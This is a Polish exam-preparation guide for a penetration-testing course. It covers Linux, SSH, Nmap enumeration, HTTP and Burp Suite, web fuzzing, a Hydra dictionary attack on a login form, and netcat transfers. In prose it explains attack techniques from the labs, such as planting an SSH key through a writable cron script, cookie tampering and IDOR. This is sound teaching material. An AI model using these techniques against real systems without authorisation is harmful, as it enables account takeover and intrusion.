---
title: Przygotowanie kolokwium 1
description: "Pełna powtórka BSI z materiałów 1-7: Linux, enumeracja, WWW, protokoły, zdalne powłoki i eskalacja uprawnień."
updated: 2026-11-15
order: 12
---

## Zakres i sposób nauki

Ta notatka zbiera materiał z **14 dostarczonych PDF-ów, łącznie 453 stron**, dotyczących ćwiczeń **1-7 oraz 1p-7p PENTEST**. Obejmuje teorię, sens wykonywanych zadań, interpretowanie wyników i zależności między tematami. Ćwiczenie 9 pominięto.

Przyjęty zakres kolokwium to ćwiczenia 1-7 zgodnie z zamówieniem. W plikach nie ma osobnego, potwierdzonego przez prowadzącego zakresu ani zestawu pytań egzaminacyjnych. Pytania na końcu są autorską powtórką z dostarczonych materiałów.

Najlepiej uczyć się w trzech krokach:

1. **Wyjaśnij mechanizm własnymi słowami.** Na przykład: kto łączy się z kim w reverse shellu?
2. **Dobierz narzędzie i opcje.** Na przykład: hosty bez portów to `nmap -sn`, a wersje usług to `-sV`.
3. **Zinterpretuj wynik.** Na przykład: `open` oznacza nasłuchującą usługę, a nie automatycznie podatność.

Dokładne sekwencje zadań znajdziesz w [rozwiązaniach](/przedmioty/bsi/bsi-rozwiazania/), a znaczenie poszczególnych przełączników w [spisie komend](/przedmioty/bsi/bsi-spis-komend/). Tutaj nacisk jest na rozumienie i przygotowanie do samodzielnego wyboru rozwiązania.

### Cały przedmiot jako jeden proces

W ćwiczeniach powtarza się taki ciąg:

**Poznaj system i sieć → znajdź hosty i usługi → obejrzyj aplikację → odkryj ujawnione zasoby → uzyskaj dostęp → sprawdź uprawnienia → wyjaśnij przyczynę problemu.**

Każdy etap dostarcza informacji do następnego. Otwarty port może prowadzić do serwera WWW; listing katalogu może ujawnić klucz SSH; klucz daje konto zwykłego użytkownika; zbyt szerokie sudo może dać uprawnienia roota. Wykonanie ostatniej komendy bez zrozumienia poprzednich etapów utrudnia rozwiązanie innego wariantu zadania.

## 1. Linux - poruszanie się po systemie i zbieranie informacji

Podstawa: **PDF 1, s. 10-31 i 33-96; PDF 1p, s. 9-17**.

### Terminal, powłoka, program i ścieżka

**Terminal** jest interfejsem do pracy tekstowej. **Powłoka**, np. Bash, interpretuje wpisane polecenia, rozwija zmienne i wzorce, uruchamia programy oraz łączy ich wejścia i wyjścia. `cat`, `ssh` i `nmap` są programami; `cd` czy `exit` są zwykle poleceniami wbudowanymi powłoki.

Polecenie ma zwykle postać `program opcje argumenty`. W `ssh student@192.168.100.101 -p 23` programem jest `ssh`, opcja `-p` otrzymuje wartość `23`, a argument wskazuje konto i host.

- **Ścieżka bezwzględna** zaczyna się od `/`, np. `/etc/passwd`.
- **Ścieżka względna** jest liczona od bieżącego katalogu, np. `./linpeas.sh`.
- `.` oznacza bieżący katalog, `..` nadrzędny, a `~` katalog domowy użytkownika.
- Nazwa zaczynająca się od kropki jest domyślnie pomijana przez zwykłe `ls`. Nadal może być dostępna po podaniu pełnej nazwy.

**Kali Linux** jest dystrybucją opartą na Debianie, przygotowaną do pracy z narzędziami bezpieczeństwa. Ubuntu, Fedora i openSUSE to inne przykłady dystrybucji; RHEL reprezentuje rozwiązania serwerowe, a Arch podejście z większym udziałem samodzielnej konfiguracji. Nazwa dystrybucji i wersja jądra to różne informacje.

Linux przydaje się w tych zajęciach dzięki narzędziom, skryptom, elastycznej konfiguracji i pracy w terminalu. Sam wybór systemu nie gwarantuje bezpieczeństwa. W zastosowaniach związanych z aplikacjami Windows, Active Directory czy analizą programów dla Windows potrzebne może być inne środowisko.

### Katalogi, które trzeba rozpoznawać

- `/` - korzeń całego drzewa systemu plików.
- `/bin` i `/usr/bin` - programy; w części systemów katalogi mogą być powiązane dowiązaniami.
- `/etc` - konfiguracja systemu i usług.
- `/home` - katalogi domowe zwykłych użytkowników.
- `/root` - katalog domowy roota; nie jest tym samym co `/`.
- `/dev` - pliki reprezentujące urządzenia, np. dyski i terminale.
- `/proc` - wirtualny widok danych jądra i procesów; zawartość nie musi być zapisana na dysku jak zwykły dokument.
- `/tmp` - dane tymczasowe; zasady ich usuwania zależą od konfiguracji systemu.
- `/var` - dane zmienne, np. logi w `/var/log`.
- `/media` - typowe punkty montowania nośników wymiennych.
- `/opt` - miejsce często używane przez dodatkowe aplikacje i skrypty; w repozytorium znajduje się tam `clean.sh`.

Przykład rozumowania: sekret w `/home/developer/.bash_history` to wyciek z katalogu użytkownika. Sekret w pliku udostępnionym przez WWW może być konsekwencją serwowania zbyt szerokiego katalogu, a nie błędu samego protokołu SSH.

### Użytkownik, UID, GID i sesje

Nazwa konta jest czytelną etykietą; system podejmuje decyzje o dostępie głównie na podstawie identyfikatorów i uprawnień.

- **UID** - identyfikator użytkownika. UID `0` ma uprawnienia roota, także gdy konto nazywa się inaczej.
- **GID** - identyfikator grupy. Konto może mieć grupę główną i dodatkowe członkostwa.
- `id` - pokazuje UID, GID i grupy; przy eskalacji może pokazać też odrębny efektywny UID.
- `whoami` - wskazuje użytkownika zgodnego z efektywnym UID bieżącego procesu.
- `echo $USER` - odczytuje zmienną środowiskową. Jej wartość może być nieaktualna lub zmieniona, więc nie zastępuje sprawdzenia uprawnień przez `id`.
- `who` - aktualnie zalogowane sesje; `last` - historia logowań.

Plik `/etc/passwd` opisuje **konta**, a nie listę osób aktualnie zalogowanych. Typowy wpis ma pola:

```text
nazwa:haslo_lub_znacznik:UID:GID:opis:katalog_domowy:powloka
```

W typowej konfiguracji `x` w drugim polu oznacza korzystanie z danych hasła w `/etc/shadow`. Puste pole jest niebezpieczne i w konfiguracji laboratorium może pozwalać na uwierzytelnienie bez hasła. Ostateczne zachowanie zależy również od zasad logowania, np. PAM.

Wpis `backup::0:0:...` jest szczególnie podejrzany: **inna nazwa konta nie zmienia znaczenia UID 0**.

### Uprawnienia do plików

Przykładowy wynik `ls -l` zaczynający się od `-rwxr-x---` czytaj tak:

- pierwszy znak opisuje typ, np. `-` zwykły plik, `d` katalog;
- kolejne trzy znaki to uprawnienia właściciela;
- następne trzy - grupy;
- ostatnie trzy - pozostałych użytkowników.

`r` to odczyt, `w` zapis, `x` wykonanie pliku. Dla katalogu `x` oznacza możliwość przechodzenia przez niego i dostępu do elementów po nazwie; znaczenie jest więc inne niż uruchamianie programu.

W zapisie liczbowym `r=4`, `w=2`, `x=1`, a prawa są sumowane. `chmod 600 klucz` daje właścicielowi `rw-`, a grupie i innym nic. `700` daje właścicielowi `rwx` i odbiera dostęp pozostałym. Dlatego klucz prywatny SSH z zadania 5.4p powinien mieć ograniczony dostęp.

**Zapis do skryptu to kontrola nad jego przyszłą treścią.** Jeśli skrypt, który możesz edytować, uruchamia ktoś z wyższymi uprawnieniami, pojawia się droga do wykonania własnych poleceń w jego kontekście. To mechanizm zadania 1.2p.

### Jak sprawdzić system, sprzęt, zasoby i procesy

Dobierz źródło do pytania:

- **Dystrybucja i jej nazwa kodowa:** `/etc/os-release`; `uname -a` opisuje głównie jądro, host i architekturę.
- **CPU i RAM:** `/proc/cpuinfo`, `/proc/meminfo`, `free -h`.
- **Urządzenia:** `lspci`, `lsusb`, `lsscsi`, `lshw`.
- **Dyski i partycje:** `lsblk`; zajętość zamontowanych systemów plików - `df -h`.
- **Procesy:** `ps aux`; zależności rodzic-dziecko - `ps auxf`; zmiany zużycia zasobów w czasie - `top`.
- **Interfejsy i IP:** `ip a`; brama i trasy - `ip r`; sąsiedzi - `ip n`.
- **DNS:** `/etc/resolv.conf`; lokalne przypisania nazw - `/etc/hosts`.
- **Nasłuchujące usługi TCP:** `ss -tlpn`.

Wynik `ps aux` może ujawnić w argumentach procesu tekst lub sekret. W zadaniu 1.9 właśnie tam jest odpowiedź. To przykład, dlaczego dane wrażliwe przekazywane jako argumenty mogą być widoczne dla innych użytkowników w zależności od konfiguracji systemu.

**Pułapki:** `free` nie pokazuje miejsca na dysku, `df` nie pokazuje RAM, a brak pliku w wyniku `locate` nie wyklucza jego istnienia - indeks może być nieaktualny. `find` przeszukuje bieżące drzewo, a `grep` szuka dopasowania w treści.

### Wejście, wyjście, przekierowania i cytowanie

Program ma standardowe strumienie: **0 - stdin**, **1 - stdout**, **2 - stderr**.

```bash
cat plik.txt | grep solution
echo dopisek >> notatka.txt
find / -name '*.conf' 2>/dev/null
```

Pierwsza linia przekazuje zawartość pliku na wejście `grep`. Druga dopisuje tekst, a nie nadpisuje. Trzecia odrzuca komunikaty błędów, zachowując znalezione ścieżki.

- `>` tworzy lub nadpisuje plik, `>>` dopisuje.
- `|` łączy stdout z wejściem następnego programu; błędy nie są automatycznie częścią potoku.
- `&&` wykonuje kolejne polecenie tylko po powodzeniu pierwszego; `;` nie stawia takiego warunku.
- `'...'` chroni treść dosłowną; `"..."` pozwala rozwijać zmienne i podstawienia poleceń.
- `$(cat plik)` jest wykonywane podczas interpretowania polecenia i zastępowane wynikiem. W zadaniu cron klucz jest więc odczytywany już przy dopisywaniu tekstu do skryptu.

Przekierowanie jest wykonywane przez powłokę. Dlatego `echo tekst | sudo tee -a /etc/hosts` pozwala zapisać chroniony plik: to `tee` ma uprawnienia sudo. Samo sudo postawione przed `echo` nie podnosi uprawnień niezależnego przekierowania `>`.

### Usługi, pakiety i cron

**Usługa** to proces lub zestaw procesów zarządzanych przez system, np. SSH albo Apache. `systemctl status ssh` pokazuje jej stan, `start` uruchamia, a `restart` uruchamia ponownie. Działająca usługa nie musi być dostępna z każdej sieci: może nasłuchiwać tylko lokalnie albo być blokowana przez zaporę.

`apt update` odświeża listy pakietów; `apt install` instaluje program; `apt upgrade` aktualizuje bez usuwania zainstalowanych pakietów, a `full-upgrade` może usuwać pakiety, aby rozwiązać zależności. `autoremove` usuwa zbędne zależności, `clean` czyści pobrane archiwa. Samo `update` nie aktualizuje programów.

**Cron** uruchamia zadania według harmonogramu. Kolejność pięciu pól czasu to:

```text
minuta godzina dzien_miesiaca miesiac dzien_tygodnia
```

`* * * * *` oznacza wykonanie co minutę. Systemowy `/etc/crontab` zawiera dodatkowo użytkownika:

```text
* * * * * developer /opt/clean.sh
```

Osobisty crontab edytowany przez `crontab -e` nie ma tego dodatkowego pola: zadania działają jako właściciel crontaba. Wpis `@reboot` uruchamia zadanie przy starcie demona. `crontab -l` służy do samego odczytu.

**Mechanizm 1p:** konto `pentest` może zmienić skrypt uruchamiany cyklicznie jako `developer`. Dopisany kod umieszcza znany klucz publiczny w `authorized_keys` developera. Po wykonaniu zadania cron można zalogować się na to konto odpowiednim kluczem prywatnym. Kolejny etap to sekret w pozostawionej historii lub pliku tymczasowym, a następnie dostęp do roota.

**Co wyjaśnić na kolokwium:** przyczyną jest niewłaściwe prawo zapisu do skryptu wykonywanego przez inne konto oraz wyciek sekretu. Sam cron jest normalną usługą i nie jest podatnością.

## 2. SSH i enumeracja usług sieciowych

Podstawa: **PDF 1, s. 10-12; PDF 2, s. 3-4 i 11-26; PDF 2p, s. 8-11**.

### SSH - co chroni i czym uwierzytelnia

SSH zapewnia szyfrowany kanał zdalnego dostępu. W ćwiczeniach uwierzytelnianie odbywa się hasłem albo parą kluczy. Klucz **prywatny** pozostaje po stronie klienta, a odpowiadający mu **publiczny** wpisuje się do `~/.ssh/authorized_keys` konta na serwerze.

Trzeba odróżnić dwa rodzaje kluczy:

- **Klucz hosta** pomaga sprawdzić, czy łączysz się z właściwym serwerem; klient zapamiętuje go zwykle w `known_hosts`.
- **Klucz użytkownika** służy do potwierdzenia tożsamości konta przy logowaniu.

Komunikat pierwszego połączenia o zaufaniu kluczowi hosta nie jest pytaniem o Twój klucz prywatny. Sprawdzenie odcisku klucza hosta ogranicza ryzyko podszycia się pod serwer; samo wpisanie `yes` bez sprawdzenia nie daje takiej pewności.

`ssh -p 23 ...` nadal używa **SSH**, mimo że port 23 kojarzy się z Telnetem. Numer portu jest wskazówką, nie dowodem protokołu. `scp` korzysta z szyfrowanego połączenia SSH do kopiowania plików. Przesłanie pliku na host nie oznacza jego wykonania - uruchomienie to osobny krok.

### Host, port, usługa, wersja i sieć

**Host** to urządzenie lub system dostępny pod adresem. **Port** określa punkt końcowy komunikacji transportowej. **Usługa** jest programem, który obsługuje określony protokół. **Wersja** doprecyzowuje, jaka implementacja programu odpowiada.

Przykład: `2725/tcp open http nginx ...` mówi o porcie TCP 2725, rozpoznanej usłudze HTTP i serwerze nginx. Nie mówi sam z siebie, że serwer można przejąć. Bez wykrywania usługi nazwa w kolumnie `SERVICE` może wynikać wyłącznie z tabeli typowych numerów portów.

Zapis `/24` w IPv4 oznacza 24 bity części sieciowej, czyli maskę `255.255.255.0` i 256 adresów w całym zakresie. W typowej podsieci część adresów ma szczególną rolę. Skan `10.13.37.0/24` obejmuje zakres adresów, a nie port numer 24.

**Enumeracja** to uporządkowane zbieranie informacji: jakie hosty odpowiadają, jakie mają porty, usługi, wersje i konfigurację. Dopiero na tej podstawie wybiera się dalsze sprawdzenia.

### Nmap jako kilka osobnych pytań

1. **Które hosty są aktywne?** `-sn` odkrywa hosty bez skanowania ich portów.
2. **Jakie porty przyjmują połączenia?** `-sT` wykonuje skan TCP connect.
3. **Jaki program odpowiada?** `-sV` wysyła sondy identyfikujące usługę i wersję.
4. **Jakie dodatkowe informacje zwracają domyślne skrypty?** `-sC` uruchamia odpowiedni zestaw NSE.
5. **Jaki system może działać na hoście?** `-O` używa fingerprintingu; `--osscan-guess` dopuszcza bardziej śmiałe dopasowania.

`-sV` i `-sC` często warto łączyć: wyniki identyfikacji usługi mogą pomóc wybrać i wykonać właściwe skrypty. Domyślne skrypty nie oznaczają wszystkich skryptów ani gwarantowanej detekcji każdej podatności.

`-A` włącza rozpoznawanie systemu, wersji, domyślne skrypty oraz traceroute. **Nie oznacza skanu wszystkich portów** - za zakres 1-65535 odpowiada `-p-`. Wyjaśnia to [dokumentacja Nmap](https://nmap.org/book/man-misc-options.html).

`-n` wyłącza DNS, `-vv` zwiększa szczegółowość komunikatów, a `-Pn` pomija wstępne rozpoznanie aktywności celu. Jeśli host blokuje sondy odkrywania, `-Pn` pozwala mimo tego spróbować skanu. Nie jest sposobem na otwieranie portów ani automatyczne obchodzenie zapory. [Dokumentacja host discovery](https://nmap.org/book/man-host-discovery.html).

W materiałach wymieniono również skan SYN `-sS`. Jest zwykle dostępny przy odpowiednich uprawnieniach do pakietów; bez nich Nmap może korzystać z TCP connect. Nie zakładaj, że domyślny tryb zawsze jest identyczny na każdym koncie i systemie.

### Jak czytać wynik i nie nadinterpretować

- **open** - usługa przyjmuje ruch na porcie według zastosowanego testu.
- **closed** - host odpowiedział w sposób wskazujący, że na tym porcie nic nie nasłuchuje.
- **filtered** - skaner nie może rozstrzygnąć, zwykle wskutek filtrowania lub braku rozstrzygającej odpowiedzi.
- Nazwa systemu z `-O` jest wynikiem dopasowania; nie zawsze jest pewna.
- Baner wersji to cenna wskazówka, lecz może być zmieniony lub nie oddawać wszystkich poprawek pakietu.
- Otwarty port jest powierzchnią dostępu, a nie automatycznym potwierdzeniem luki.

W 2p po enumeracji odczytujesz pliki przez HTTP, FTP i SMB. Zmiana portu HTTP na `8080` nie zmienia protokołu. `smbclient -L` listuje udziały, a połączenie do `//host/FLAG` otwiera konkretny udział. `get` wewnątrz klienta pobiera plik.

### Z której maszyny wykonać skan?

Wiele celów PENTEST jest dostępnych **dopiero z maszyny ćwiczeniowej**. Najpierw łączysz się z nią przez SSH, a następnie uruchamiasz Nmap, curl czy Lynx z jej wnętrza. Niepowodzenie z Kali może oznaczać brak trasy do danej sieci, a nie brak usługi.

W 5p i 7p przenosisz Nmap na maszynę bez Internetu: pobranie na Kali → `scp` → SSH → rozpakowanie → `./nmap`. Każdy krok ma osobny cel. Prefiks `./` wybiera program z bieżącego katalogu.

Enumeracja może też obejmować DNS, SMB, SNMP i ujawnione repozytoria. W teorii pojawiają się Masscan, RustScan i inne skanery, narzędzia DNS oraz PowerShell i SharpHound w kontekście Windows/Active Directory. Do tych zajęć najważniejsze jest rozumienie, **jakich danych szuka dana metoda**.

## 3. HTTP, Burp Suite i błędy logiki aplikacji

Podstawa: **PDF 3, s. 8-18 i 20-39; PDF 3p, s. 8-16**.

### Co zawiera żądanie i odpowiedź HTTP

HTTP działa jako wymiana żądania i odpowiedzi. Żądanie zawiera metodę, ścieżkę, nagłówki i ewentualną treść. Przykład dla mechanizmu z repozytorium:

```http
GET /usersdata/4/ HTTP/1.1
Host: 192.168.100.153
Cookie: debug=true

```

`GET` to metoda, `/usersdata/4/` ścieżka z identyfikatorem, `Host` wskazuje host wirtualny, a `Cookie` przenosi wartość ciasteczka. Pusta linia oddziela nagłówki od ewentualnej treści.

**GET** zwykle pobiera zasób; parametry mogą być w adresie po `?`. **POST** często przesyła dane formularza w treści żądania. POST sam w sobie nie zapewnia poufności. Do tego potrzebny jest chroniony transport, np. HTTPS.

Odpowiedź zawiera status, nagłówki i ciało. Rozpoznawaj podstawowe klasy:

- `2xx` - powodzenie, np. `200 OK`;
- `3xx` - przekierowanie lub inna odpowiedź tej klasy, np. `302` z nagłówkiem `Location`;
- `4xx` - problem po stronie żądania lub dostępu, np. `401`, `403`, `404`;
- `5xx` - błąd serwera.

Brak flagi na widocznej stronie nie oznacza jej braku w odpowiedzi. W zadaniu 3.1 flaga jest w **nagłówku odpowiedzi**, a nie w treści HTML. Trzeba obejrzeć całą odpowiedź.

### Proxy i moduły Burpa - dobierz właściwy

Burp działa tu jako pośrednik między przeglądarką a serwerem. Ruch musi przechodzić przez jego proxy: przez przeglądarkę wbudowaną lub prawidłowo skonfigurowaną zewnętrzną. Do oglądania HTTPS w takim środowisku potrzebne jest też odpowiednie zaufanie do certyfikatu proxy.

- **HTTP history:** obejrzenie ruchu, który już przeszedł. Użyj, gdy chcesz znaleźć żądanie, nagłówki, odpowiedź albo dane ukryte przez przekierowanie.
- **Intercept:** zatrzymanie żądania przed wysłaniem i ręczna zmiana wartości. `Forward` puszcza żądanie dalej. Pozostawiony Intercept może powodować wrażenie, że przeglądarka przestała działać.
- **Repeater:** ręczne modyfikowanie i ponowne wysyłanie tego samego żądania; dobre do porównania kilku wariantów.
- **Intruder:** automatyzacja wielu żądań. Oznaczasz fragment do zmiany i wybierasz generator wartości.
- **Decoder:** kodowanie i dekodowanie reprezentacji danych, np. Base64 i URL encoding.

**Null payloads** nadają się do powtarzania identycznego żądania, np. głosowania. **Numbers 1-50** nadają się do sprawdzenia kolejnych identyfikatorów. Znaczniki `§` wyznaczają obszar podstawiania, nie są częścią rzeczywistej ścieżki serwera.

Jeśli chcesz zrozumieć wpływ jednej zmiany, użyj Repeatera. Jeśli chcesz sprawdzić 50 wartości jednego parametru, użyj Intrudera. Samo zwiększenie liczby żądań nie zastępuje porównania odpowiedzi: sprawdzaj status, długość i treść.

### Czego uczą modyfikacja parametrów i ponowne głosowanie

Przeglądarka nie jest zaufaną granicą bezpieczeństwa. Użytkownik może zmienić parametr, ciasteczko, identyfikator w URL i całe żądanie, niezależnie od tego, co pokazuje formularz.

W zadaniu 3.2 zmiana parametru powoduje zaliczenie zadania. W 3.3 i 3.4 wielokrotne przesłanie żądania głosowania ujawnia, czy serwer faktycznie kontroluje liczbę głosów. Wyłączenie przycisku w przeglądarce nie zatrzyma Repeatera.

**Wniosek:** warunki dostępu, uprawnienia oraz ograniczenia operacji muszą być sprawdzane po stronie serwera. Parametr przesłany przez klienta jest żądaniem, a nie dowodem, że operacja jest dozwolona.

### Ciasteczka, przekierowania i identyfikatory

W 3.1p zmieniasz ciasteczko, w repozytorium `debug=false` na `true`. Jeśli samo to daje dostęp do dodatkowych danych, aplikacja nadmiernie ufa wartości kontrolowanej przez klienta. W prawidłowym modelu serwer ustala uprawnienia na podstawie własnego stanu i zweryfikowanej sesji.

**Przekierowanie nie usuwa danych z odpowiedzi.** Przeglądarka może automatycznie przejść na inną stronę, lecz Burp pozwala zobaczyć wcześniejszą odpowiedź, nagłówki i wskazane ścieżki. Kontrola dostępu musi nastąpić przed ujawnieniem chronionej treści.

W 3.3p Intruder zmienia ID w `/usersdata/ID/`. Gdy można odczytać cudze dane wyłącznie przez zmianę identyfikatora, jest to problem kontroli dostępu do obiektu, często określany jako **IDOR**. Sam fakt istnienia kolejnych numerów nie jest błędem - błędem jest brak sprawdzenia, czy dane konto ma prawo do wskazanego obiektu.

### Base64, URL encoding i obfuskacja

**Base64 jest kodowaniem, nie szyfrowaniem.** Zmienia reprezentację danych według jawnej reguły, bez sekretnego klucza. Decoder może odtworzyć ukryty w ten sposób adres lub flagę. Zakodowanie danych nie nadaje im poufności.

**URL encoding** przedstawia wybrane bajty zapisem `%HH`; `%20` to spacja. W kontekście danych formularzowych `+` może oznaczać spację, a literalny plus zapisuje się jako `%2B`. Kodowanie adresu pomaga prawidłowo przesłać tekst, lecz nie stanowi zabezpieczenia przed wykonaniem komendy przez aplikację.

**Obfuskacja** utrudnia czytanie kodu, zachowując jego działanie. Deobfuskacja porządkuje zapis, aby dało się rozpoznać funkcje i ciągi znaków. JavaScript wysyłany do klienta jest dostępny do analizy; ukryty w nim adres pliku nie powinien być traktowany jako sekret chroniący dostęp.

W 3.5p po uproszczeniu kodu odkrywasz nazwę następnego zasobu. Nie chodzi o łamanie szyfrowania, lecz o analizę kodu, który serwer już udostępnił.

### Narzędzia alternatywne

Materiały przedstawiają Community i Professional Burpa oraz alternatywy: ZAP, Fiddler, mitmproxy i Charles. Do podstawowego oglądania żądań wystarcza też zakładka Network w narzędziach deweloperskich przeglądarki. Na potrzeby powtórki rozróżniaj **podgląd ruchu**, **ręczną modyfikację**, **automatyzację żądań** i **automatyczne wyszukiwanie podatności** - są to różne funkcje.

## 4. Enumeracja zasobów WWW i logowanie

Podstawa: **PDF 4, s. 4-5 i 10-22; PDF 4p, s. 7-16**.

### Co właściwie odkrywamy?

Enumeracja WWW polega na znajdowaniu dostępnych ścieżek i nazw, które nie muszą być podlinkowane w interfejsie:

- katalogi administracyjne i panele logowania;
- pliki konfiguracyjne i kopie zapasowe;
- stare wersje aplikacji;
- archiwa, zrzuty danych, pliki tymczasowe;
- hosty wirtualne i subdomeny;
- wartości parametrów, które zmieniają odpowiedź aplikacji.

**Brak linku nie jest kontrolą dostępu.** Każdy może sam zbudować URL. Nietypowa nazwa może utrudnić przypadkowe znalezienie zasobu, lecz uprawnienia nadal powinny być egzekwowane przez serwer.

### Katalog, plik, vhost, subdomena, parametr

To pięć różnych miejsc podstawiania wartości:

1. **Katalog:** zmieniasz fragment ścieżki, np. `/admin/`.
2. **Plik:** szukasz konkretnego elementu w katalogu, np. `/admin/login.php`.
3. **Vhost:** zmieniasz nazwę hosta w żądaniu do tego samego serwera.
4. **Subdomena:** sprawdzasz nazwy typu `beta.developer`; może to być test HTTP vhostów, a nie zapytanie do publicznego DNS.
5. **Parametr:** zmieniasz np. `?password=FUZZ`, nie samą ścieżkę zasobu.

**Wirtualny host** umożliwia serwowanie wielu aplikacji pod jednym IP. Dla HTTP serwer może wybierać witrynę na podstawie nagłówka `Host`. Dlatego wejście na sam adres IP może pokazywać inną stronę niż wejście na nazwę.

W HTTPS dodatkowo istotna jest nazwa używana podczas zestawiania TLS. W ćwiczeniu nazwę odkrywasz z certyfikatu, a potem dodajesz do lokalnego `/etc/hosts`. To zapewnia rozwiązywanie nazwy na właściwy adres w Twoim środowisku.

Slajdy posługują się polem Common Name. W praktycznym odczycie certyfikatu można też napotkać listę nazw SAN. Odczytana nazwa jest wskazówką o konfiguracji, a nie automatycznym dowodem, że dowolna inna nazwa prowadzi do tej samej aplikacji.

### Dobór słownika i interpretacja odpowiedzi

Gobuster i FFUF wykonują wiele prób na podstawie listy słów. Jakość wyniku zależy od **słownika, miejsca podstawienia i filtrowania**. SecLists dostarcza różne kolekcje: katalogi, pliki, hosty i hasła. Ścieżki do nich mogą różnić się między instalacjami.

Nie wystarczy uznać każdego `200` za znaleziony sekret. Niektóre aplikacje zwracają tę samą stronę błędu ze statusem 200 dla dowolnej ścieżki. Z kolei `403` może wskazywać istniejący, lecz zabroniony zasób, a przekierowanie może prowadzić do logowania.

**Praktyczna metoda:** wyślij próbę dla nieistniejącego zasobu, zapamiętaj typową odpowiedź i dopiero potem szukaj różnic. Porównuj kod, długość, treść i cel przekierowania.

`--exclude-length` w Gobusterze i `-fs` w FFUF odrzucają określoną długość odpowiedzi. Liczba `334` z repozytorium i `316` pokazana w PDF są zależne od instancji. Przepisanie filtra bez sprawdzenia może ukryć ważny wynik.

`-k` pozwala kontynuować połączenie HTTPS bez prawidłowej weryfikacji certyfikatu. **Połączenie nadal jest szyfrowane**, ale traci się ważny element potwierdzenia tożsamości serwera.

### Atak słownikowy na formularz

W 4.5p Hydra testuje kolejne hasła ze słownika w formularzu HTTPS POST. Potrzebuje właściwego hosta, ścieżki, nazw pól i sposobu rozpoznania niepowodzenia.

W ciągu `p=^PASS^:Wrong password` część `p=^PASS^` opisuje wysyłane dane, a `Wrong password` tekst występujący przy nieudanym logowaniu. Jeśli wskażesz nieprawidłowy tekst, narzędzie może błędnie oznaczać wyniki.

**Atak słownikowy** sprawdza przygotowaną listę kandydatów. **Pełny brute force** generuje kombinacje według reguł lub alfabetu. W potocznym języku slajdów nazwy bywają używane szerzej, ale na kolokwium warto umieć wskazać różnicę.

Wniosek z ćwiczenia: słabe hasło oraz brak odpowiednich ograniczeń prób zwiększają ryzyko. Znaleziony kandydat wymaga potwierdzenia logowaniem; sam komunikat narzędzia nie wystarcza.

## 5. Protokoły, transfer plików i serwery

Podstawa: **PDF 5, s. 11-14, 17-33, 37-59; PDF 5p, s. 9-18**.

### Warstwa transportowa a aplikacyjna

W materiałach TCP i UDP są protokołami **warstwy transportowej**, a HTTP, FTP, SMB i komunikacja przez SSH realizują potrzeby **wyższych warstw**. Ten podział odpowiada dwóm pytaniom: jak przesłać dane między procesami oraz co te dane znaczą dla aplikacji.

W omawianych ćwiczeniach serwery HTTP/HTTPS, FTP, SMB i SSH korzystają z TCP. Nie wyciągaj z tego wniosku, że każda możliwa wersja każdego protokołu internetowego zawsze musi korzystać z TCP.

Protokołów jest wiele, ponieważ różnią się przeznaczeniem, wymaganiami dotyczącymi niezawodności, sposobem logowania i organizacją danych. Oprócz modelu klient-serwer materiały wspominają P2P, gdzie uczestnicy mogą wymieniać dane bez jednego centralnego serwera, oraz udostępnianie przez usługi hostingowe.

### TCP i UDP - odpowiedź własnymi słowami

**TCP** tworzy połączenie i dostarcza aplikacji uporządkowany strumień bajtów. Używa numeracji, potwierdzeń i retransmisji; przy problemach transmisja może czekać albo się zakończyć błędem. Zestawienie połączenia opisuje trójfazowy handshake: **SYN → SYN/ACK → ACK**.

**UDP** wysyła niezależne datagramy. Sam nie zapewnia retransmisji, zachowania kolejności ani potwierdzenia odbioru. Aplikacja może dodać własne mechanizmy, ale prosty transfer z ćwiczenia ich nie dodaje.

Konsekwencja: plik odebrany przez UDP może mieć braki, chociaż polecenie zakończyło się bez oczywistego błędu. Dlatego w ćwiczeniu porównujesz sumę pliku i w razie potrzeby powtarzasz transfer.

**TCP nie oznacza szyfrowania.** Gwarancje transportowe i poufność to osobne cechy. HTTP działające po TCP nadal może przesyłać czytelną treść; HTTPS dodaje TLS.

### Connect/listen oraz upload/download to różne osie

**Connect/listen** mówi, kto zaczyna komunikację. **Upload/download** mówi, w którą stronę przesyłany jest plik z perspektywy zadania.

- **Connect + download:** łączysz się z portem celu, odbierane bajty zapisujesz przez `> plik`.
- **Connect + upload:** łączysz się z celem, a `cat plik | nc ...` wysyła bajty pliku.
- **Listen + download:** Ty nasłuchujesz, cel przychodzi do Ciebie i wysyła plik; zapisujesz go przez `>`.
- **Listen + upload:** Ty nasłuchujesz i po przyjściu klienta przesyłasz mu plik podany na wejście `nc`.

To samo rozróżnienie obowiązuje dla TCP i UDP, z uwzględnieniem bezpołączeniowego charakteru UDP. Nazwa trybu narzędzia nie nadaje UDP gwarancji TCP.

Najczęstszy błąd: uznanie, że nasłuchująca strona zawsze odbiera plik. Nasłuch określa sposób nawiązania kontaktu, a kierunek danych wynika z wejścia i wyjścia programu.

### Protokoły i typowe porty

Numery pomagają zapamiętać standardową konfigurację, ale usługa może pracować gdzie indziej:

- **HTTP - TCP 80:** żądania i odpowiedzi aplikacji WWW; bez TLS brak poufności transportu.
- **HTTPS - TCP 443 w ćwiczeniach:** HTTP chronione TLS; przy poprawnej weryfikacji certyfikatu chroni także przed podszyciem się pod serwer.
- **FTP - TCP 21 dla kanału sterującego:** logowanie, listowanie i transfer plików; transmisja danych używa dodatkowego kanału. Zwykłe FTP nie szyfruje haseł ani treści.
- **SMB - zwykle TCP 445:** dostęp do udziałów plikowych i innych zasobów. Dostęp bez hasła musi być dopuszczony konfiguracją; nie jest cechą każdego udziału. Nowsze wersje SMB mają możliwości ochrony transmisji, których użycie zależy od konfiguracji.
- **SSH - TCP 22:** szyfrowany dostęp zdalny; służy też jako podstawa kopiowania plików narzędziami SSH.

**FTPS i SFTP nie są tym samym.** FTPS dodaje TLS do FTP; SFTP działa w ramach SSH. Ta różnica pomaga uniknąć błędnego skojarzenia, że każdy bezpieczny transfer o podobnej nazwie używa tego samego serwera.

### Co dokładnie uruchamiasz w zadaniach?

- Python `http.server` udostępnia **bieżący katalog**. Uruchomiony w katalogu domowym może ujawnić pliki, które nie miały być publiczne.
- Apache to osobny serwer WWW. Włączenie `ssl`, witryny `default-ssl.conf` i restart pozwalają uruchomić wariant HTTPS z konfiguracji ćwiczenia.
- `pyftpdlib` jest modułem pozwalającym uruchomić serwer FTP.
- `smbserver.py` z Impacket udostępnia wybrany katalog pod nazwą udziału; `0.0.0.0` oznacza nasłuch na wszystkich interfejsach IPv4.
- Usługa SSH umożliwia zdalne logowanie i transfer przez narzędzia oparte na SSH.

